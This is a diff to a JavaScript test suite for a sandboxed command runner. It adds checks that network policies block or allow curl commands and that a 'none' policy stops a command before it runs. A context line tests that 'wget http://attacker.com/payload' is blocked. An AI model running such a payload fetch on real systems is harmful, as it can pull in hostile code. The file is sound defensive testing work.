@@ -62,6 +62,19 @@ describe('DYNO Runner Foundation & Execution Engine', () => {
       expect(classifyCommandSafety('wget http://attacker.com/payload', 'none')).toBe('blocked');
       expect(classifyCommandSafety('git clone https://github.com/repo', 'none')).toBe('blocked');
       expect(classifyCommandSafety('npm test', 'none')).toBe('allowed');
+      expect(classifyCommandSafety('curl http://localhost:8787/health', 'local_only')).toBe('allowed');
+      expect(classifyCommandSafety('curl https://example.com', 'local_only')).toBe('blocked');
+    });
+
+    it('should enforce a blocked network policy before spawning the command', async () => {
+      const sandbox = await DynoSandbox.create({ prefix: 'dyno-test-network-', networkPolicy: 'none' });
+      try {
+        const result = await sandbox.exec('curl https://example.com');
+        expect(result.exitCode).toBe(126);
+        expect(result.stderr).toContain('network policy denied execution');
+      } finally {
+        await sandbox.cleanup();
+      }
     });
 
     it('should refuse to execute destructive commands on host inside sandbox', async () => {
